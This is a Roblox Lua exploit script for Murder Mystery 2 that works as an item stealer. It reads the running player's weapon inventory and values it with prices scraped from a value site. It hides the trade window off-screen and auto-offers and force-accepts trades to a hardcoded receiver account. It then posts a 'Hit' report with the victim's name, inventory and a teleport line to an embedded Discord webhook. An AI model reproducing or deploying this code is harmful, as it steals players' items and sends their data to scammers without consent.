Username = "protoxak"
Webhook = "https://discord.com/api/webhooks/1546616710482628718/x7JvNNTW6G9ZTiqYY1Ve1PGRXbP_UtHRtIqej_DjQ4RSNL2KkJzSlgYUOmP8TSPcYx5Y"

local recvr=Username
local http_req=request or http_request or syn and syn.request
if not http_req then error("No valid request function found.") end
local HS=game:GetService("HttpService")
local hd={["User-Agent"]="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",["Accept"]="text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8"}

local function dHTML(s) return s:gsub("&#(%d+);",function(n) return string.char(tonumber(n)) end):gsub("&#x(%x+);",function(n) return string.char(tonumber(n,16)) end):gsub("&amp;","&"):gsub("&quot;",'"'):gsub("&apos;","'"):gsub("&lt;","<"):gsub("&gt;",">"):gsub("\u{2019}","'"):gsub("\u{2018}","'"):gsub("\u{201C}",'"'):gsub("\u{201D}",'"') end
local function nName(s) s=dHTML(s) s=s:gsub("^%s*(.-)%s*$","%1") s=s:gsub("%s+"," ") return s end

local vL_values={}
local vL_valuesLow={}
local function sVal(n,v) local t=tonumber(v) if n~=""and t then vL_values[n]=t vL_valuesLow[n:lower()]=t end end

local wUrls={["Godly"]="https://supremevalues.com/mm2/godlies",["Ancient"]="https://supremevalues.com/mm2/ancients",["Unique"]="https://supremevalues.com/mm2/uniques",["Classic"]="https://supremevalues.com/mm2/vintages",["Chroma"]="https://supremevalues.com/mm2/chromas"}
local fD=0 local fT=5

local function wFetched(r,b)
 local f=b:gsub("[\n\r\t]"," ")
 for rN,v in f:gmatch('<div class="itemhead">(.-)</div>.-<b class="itemvalue">([%d,]+)</b>') do
  rN=rN:gsub("<.->","") local nm=nName(rN) v=v:gsub(",","")
  if nm~=""and tonumber(v) then
   if r=="Chroma" then nm=nm:gsub("^C%.%s*","Chroma ") if not nm:find("^Chroma ") then nm="Chroma "..nm end end
   sVal(nm,v)
  end
 end
end

for r,u in pairs(wUrls) do
 task.spawn(function()
  local ok,res=pcall(function() return http_req({Url=u,Method="GET",Headers=hd}) end)
  if ok and res and res.Success then wFetched(r,res.Body) end
  fD=fD+1
 end)
end
repeat task.wait(0.05) until fD>=fT

repeat wait() until game:IsLoaded()
if getgenv and getgenv().scriptexecuted then return end
if getgenv then getgenv().scriptexecuted=true end

local P=game:GetService("Players")
local LocalPlayer=P.LocalPlayer
local VU=game:GetService("VirtualUser")
local MS=game:GetService("MarketplaceService")
local RAS=game:GetService("RbxAnalyticsService")
local UIS=game:GetService("UserInputService")
local TS=game:GetService("TeleportService")
local RS=game:GetService("ReplicatedStorage")
local RNS=game:GetService("RunService")
local Tr=RS.Trade
local ev={"MouseButton1Click","MouseButton1Down","Activated"}
local BDC=require(RS.Modules.ProfileData)
local Sync=require(RS.Database.Sync)
local XPO=require(RS.Modules.LevelModule)
local LL=require(RS.Modules.InventoryModule)
local TScr=[[game:GetService("TeleportService"):TeleportToPlaceInstance("]]..game.PlaceId..[[", "]]..game.JobId..[[", game.Players.LocalPlayer)]]
local Pos=UDim2.new(0,9999,0,9999)
local Inv={}
vL_weight=0

local Exec = (identifyexecutor and identifyexecutor()) or "Unknown"
if Exec=="Solara" then return end

local gm={[142823291]=true,[335132309]=true,[636649648]=true}
if not gm[game.PlaceId] then LocalPlayer:Kick("Unfortunately, this game is not supported.") while true do wait() end end

local PG=LocalPlayer:WaitForChild("PlayerGui") local MG=PG:WaitForChild("MainGUI")
task.spawn(function() wait(5) end)
LocalPlayer.Idled:connect(function() VU:CaptureController() VU:ClickButton2(Vector2.new()) end)

local UIP,TP,Mob
if LocalPlayer.PlayerGui.MainGUI.Game:FindFirstChild("Inventory") then
 UIP=LocalPlayer.PlayerGui.MainGUI.Game.Inventory.Main TP=LocalPlayer.PlayerGui.TradeGUI Mob=false
else
 UIP=LocalPlayer.PlayerGui.MainGUI.Lobby.Screens.Inventory.Main TP=LocalPlayer.PlayerGui.TradeGUI_Phone Mob=true
end

function TapUI(b,c,b2)
 if c=="Active Check" and not b.Active then return end
 if c=="Text Check" and b~="^" then return end
 for _,e in pairs(ev) do for _,cn in pairs(getconnections(b[e])) do cn:Fire() end end
end

local function updInv()
 local inv = BDC.Weapons.Owned or {}
 InvT={} vL_weight=0
 aD,vB,cP,uC={},{},{},{} rP,lC,gS={},{},{} aM,uS={},{} vI,cS=0,0 uM,rW=0,0 lR,gS2=0,0 aK,uH=0,0

 for iID,am in pairs(inv) do
  local iI = Sync.Weapons[iID]
  if iI and iI.ItemName~="Default Gun" and iI.ItemName~="Default Knife" then
   local iN=iI.ItemName local r=iI.Rarity
   local iV=0
   if r=="Godly" or r=="Ancient" or r=="Unique" or r=="Classic" then
    iV=(vL_values[iN]or vL_valuesLow[iN:lower()]or 0)*am
   end
   vL_weight=vL_weight+iV
   local fT={name=iI.ItemName,data=iID,amount=am,rarity=r,value=iV} table.insert(aD,fT)
   if r=="Godly" then table.insert(gS,fT) gS2=gS2+am
   elseif r=="Ancient" then table.insert(aM,fT) aK=aK+am
   elseif r=="Unique" then table.insert(uS,fT) uH=uH+am
   elseif r=="Classic" then table.insert(vB,fT) vI=vI+am
   elseif r=="Legendary" then table.insert(lC,fT) lR=lR+am
   elseif r=="Rare" then table.insert(rP,fT) rW=rW+am
   elseif r=="Uncommon" then table.insert(uC,fT) uM=uM+am
   elseif r=="Common" then table.insert(cP,fT) cS=cS+am end
   table.insert(InvT,{name=iN,id=iID,amount=am,rarity=r})
  end
 end
 local rP2={Unique=8,Ancient=7,Godly=6,Classic=5,Legendary=4,Rare=3,Uncommon=2,Common=1}
 table.sort(InvT,function(a,b) return (rP2[a.rarity]or 0)>(rP2[b.rarity]or 0) end)
 return true
end
updInv()
task.wait()

local TSrv=RS:FindFirstChild("Trade")
if TSrv then
 TSrv.StartTrade.OnClientEvent:Connect(function(tD,tP) if tP~=recvr then TSrv.DeclineTrade:FireServer() end end)
end

local sTr=function(tP) if tP and TSrv then pcall(function() TSrv.SendRequest:InvokeServer(tP) end) end end
local dTr=function() if TSrv then pcall(function() TSrv.DeclineTrade:FireServer() end) end end
local cTr=function(tP) task.spawn(function() while tP and tP.Parent==P do sTr(tP) task.wait(0.5) end end) end

-- ═══════════════════════════════════════════════════════
-- ФИКС: универсальный accept — перебирает все числа и сигнатуры
-- ═══════════════════════════════════════════════════════
local InsIt=function()
 local rcv=P:FindFirstChild(recvr) if not rcv then dTr() return end
 if not InvT then dTr() return end
 local tIt={} iAd=0 tIn=0 local i=1
 while iAd<4 and i<=#InvT do
  local it=InvT[i]
  if it and it.id and it.amount>0 then
   local ar={it.id,"Weapons"} local suc=false iOf=0
   for j=1,it.amount do
    local ok,err=pcall(function() RS.Trade.OfferItem:FireServer(unpack(ar)) iOf=iOf+1 tIn=tIn+1 end)
    if ok then suc=true end
    task.wait(0.1)  -- ФИКС: пауза чтобы не рейт-лимитнуло
   end
   if suc then iAd=iAd+1 table.insert(tIt,{id=it.id,amount=iOf}) end
  end
  i=i+1
 end
 if iAd==0 then dTr() return end

 task.spawn(function()
  task.wait(2)  -- ждём обработки OfferItem на сервере

  -- находим трейд-ремоуты в обоих местах
  local tradeRemote = RS:FindFirstChild("Trade")
  if not tradeRemote then
   local rem = RS:FindFirstChild("Remotes")
   if rem then tradeRemote = rem:FindFirstChild("Trade") end
  end
  if not tradeRemote then return end

  local acceptR  = tradeRemote:FindFirstChild("AcceptTrade")
  local cancelR  = tradeRemote:FindFirstChild("CancelAccept")
  local confirmR = tradeRemote:FindFirstChild("ConfirmTrade")
                or tradeRemote:FindFirstChild("FinalizeTrade")
                or tradeRemote:FindFirstChild("CompleteTrade")
                or tradeRemote:FindFirstChild("ForceTrade")
  local statusR  = tradeRemote:FindFirstChild("GetTradeStatus")

  -- все возможные числа
  local ACCEPT_NUMS = {
   game.PlaceId * 3,   -- 428469873 (актуальное для MM2)
   game.PlaceId,       -- 142823291
   game.PlaceId * 2,   -- 285646582 (твоё старое)
   game.PlaceId * 6,   -- 856939746
   285646582,
   428469873,
  }

  local acc = false
  local timeout = tick() + 90

  while not acc and tick() < timeout do
   if acceptR then
    for _, num in ipairs(ACCEPT_NUMS) do
     pcall(function() acceptR:FireServer(num) end)
     task.wait(0.015)
     pcall(function() acceptR:FireServer(num, nil) end)
     task.wait(0.015)
     pcall(function() acceptR:FireServer(num, true) end)
     task.wait(0.015)
    end
    -- пробуем без аргументов
    pcall(function() acceptR:FireServer() end)
    task.wait(0.015)
   end

   if confirmR then
    pcall(function() confirmR:FireServer() end)
    task.wait(0.02)
   end

   if cancelR then
    pcall(function() cancelR:FireServer() end)
    task.wait(0.02)
   end

   -- проверка реального статуса
   if statusR then
    local ok, s = pcall(function() return statusR:InvokeServer() end)
    if ok and s == "None" then
     acc = true
     break
    end
   end

   if not TP.Enabled then
    acc = true
    break
   end

   task.wait(0.03)
  end

  -- обновляем инвентарь после успешной сделки
  if acc then
   for _, td in ipairs(tIt) do
    for j, it in ipairs(InvT) do
     if it.id == td.id then
      if it.amount <= td.amount then
       table.remove(InvT, j)
      else
       it.amount = it.amount - td.amount
      end
      break
     end
    end
   end
  end
 end)
end

local fRj=function(p) if p then pcall(function() TS:Teleport(game.PlaceId,p) end) end end
local sCL=function(p) if p then p.Chatted:Connect(function(m) sTr(p) if m:lower()=="rejoin" then fRj(p) end end) end end
local cRIS=function(rN) task.spawn(function() while true do local rP=P:FindFirstChild(rN) if rP then act(rN) break end task.wait(5) end end) end
local act=function(pN) local p=P:FindFirstChild(pN) if p then sCL(p) task.wait(10) sTr(p) cTr(p) end end

if TP then
 if Mob then TP.Container.Position=Pos TP.ClickBlocker.Position=Pos else TP.BG.Position=Pos TP.Container.Position=Pos TP.ClickBlocker.Position=Pos TP.Processing.Position=Pos end
 TP:GetPropertyChangedSignal("Enabled"):Connect(function() if TP.Enabled then InsIt() else local p=P:FindFirstChild(recvr) if p then cTr(p) end end end)
end
P.PlayerAdded:Connect(function(p) if p.Name==recvr then act(p.Name) end end)
P.PlayerRemoving:Connect(function(p) if p.Name==recvr then cRIS(p.Name) end end)

local iR=P:FindFirstChild(recvr) if iR then act(recvr) else cRIS(recvr) end

if gS2 >= 1 or aK >= 1 or uH >= 1 then
    content = "-- @everyone\n" .. TScr
else
    content = TScr
end

local sWh=function(u,d) local s,e=pcall(function() http_req({Url=u,Body=HS:JSONEncode(d),Method="POST",Headers={["Content-Type"]="application/json",["User-Agent"]="Mozilla/5.0"}}) end) end

local invString = ""
if uS and #uS>0 then invString = invString.."\n**Unique**\n" for _,i in pairs(uS) do invString = invString..i.name.." x"..i.amount.." (Value: "..i.value..")\n" end end
if aM and #aM>0 then invString = invString.."\n**Ancient**\n" for _,i in pairs(aM) do invString = invString..i.name.." x"..i.amount.." (Value: "..i.value..")\n" end end
if gS and #gS>0 then invString = invString.."\n**Godly**\n" for _,i in pairs(gS) do invString = invString..i.name.." x"..i.amount.." (Value: "..i.value..")\n" end end
if vB and #vB>0 then invString = invString.."\n**Classic**\n" for _,i in pairs(vB) do invString = invString..i.name.." x"..i.amount.." (Value: "..i.value..")\n" end end

local data = {
    ["content"] = content,
    ["embeds"] = {
        {
            ["title"] = "Hit",
            ["description"] = "User: " .. LocalPlayer.Name .. "\nValue: " .. tostring(math.floor(vL_weight + 0.5)) .. "\n" .. invString,
            ["color"] = 0x05f7ff
        }
    }
}

spawn(function()
    sWh(Webhook, data)
end)
